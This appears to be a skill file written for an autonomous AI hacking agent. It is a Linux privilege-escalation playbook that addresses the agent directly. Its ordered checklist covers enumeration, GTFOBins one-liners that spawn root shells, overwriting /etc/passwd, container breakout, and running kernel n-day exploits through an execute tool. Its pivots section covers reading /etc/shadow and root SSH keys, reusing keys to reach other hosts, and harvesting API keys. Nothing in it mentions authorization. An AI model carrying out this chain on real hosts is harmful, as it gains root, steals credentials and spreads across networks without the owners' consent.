# skill: privesc_linux
title: Linux Privilege Escalation (GTFOBins × PEASS distillation)
when: www-data,shell,reverse,sudo,suid,privesc,root,escalate,linux,privilege,uid

## OPERATING PRINCIPLE
You have a shell as a low user. The host itself is now the target: find ONE
misconfiguration among the classic seven and you are root. Enumerate in
order of likelihood; never brute blindly what you can read.

## CHAIN (through cmd_exec_probe / shell_exec / shell_session)
1. Identity & context: `id`, `sudo -l`, `cat /etc/passwd`, `uname -a`,
   `cat /etc/os-release`. `sudo -l` FIRST — a NO PASSWD entry ends the game.
2. SUID sweep: `find / -perm -4000 -type f 2>/dev/null`
3. Capabilities: `getcap -r / 2>/dev/null` (cap_setuid = instant root).
4. Cron: `cat /etc/crontab; ls -la /etc/cron*` — writable scripts = persistence.
5. Writable paths in PATH: `echo $PATH`; `find / -writable -type d 2>/dev/null`.
6. Services running as root: `ps aux | grep root`; config files they read.
7. Secrets in history: `cat ~/.bash_history /home/*/.bash_history 2>/dev/null`.

## TECHNIQUE MATRIX (GTFOBins — verify the binary is SUID or sudo-allowed first)
- find:    `find . -exec /bin/sh -p \; -quit`
- vim:     `sudo vim -c ':!/bin/sh'`
- python:  `python3 -c 'import os; os.execl("/bin/sh","sh","-p")'`
- nmap:    old interactive: `nmap --interactive` → `!sh`; else NSE script path
- less/more: `!sh` (paging a file first)
- tar:     `tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh`
- awk:     `awk 'BEGIN {system("/bin/sh -p")}'`
- env:     `sudo env /bin/sh` (if env in sudoers)
- cp:      overwrite /etc/passwd with your own root line (backup first)
- docker/lxd group: container breakout — mount host / as volume.
- Kernel (uname -a): match to known CVEs via nvd_search(keyword="<ver> privesc")
  then nday_exploit(cve_id, verify_url, execute) — remote privesc via CVE.

## PIVOTS
- Read /root/.ssh, /etc/shadow (crack offline), app configs with DB creds.
- ~/.ssh keys → pivot to other hosts (port_scan_sync then ssh).
- Env vars of root services often hold API keys → secret_scan on dumps.

## FAILURE MODES
- sudo -l needs password: check reused password in history/configs first.
- SUID binary unknown to GTFOBins: test flags (-p, interactive shells).
- No obvious vector: PEASS-ng logic — diff /proc mounts, capabilities, NFS
  no_root_squash, writable /etc/ld.so.preload.
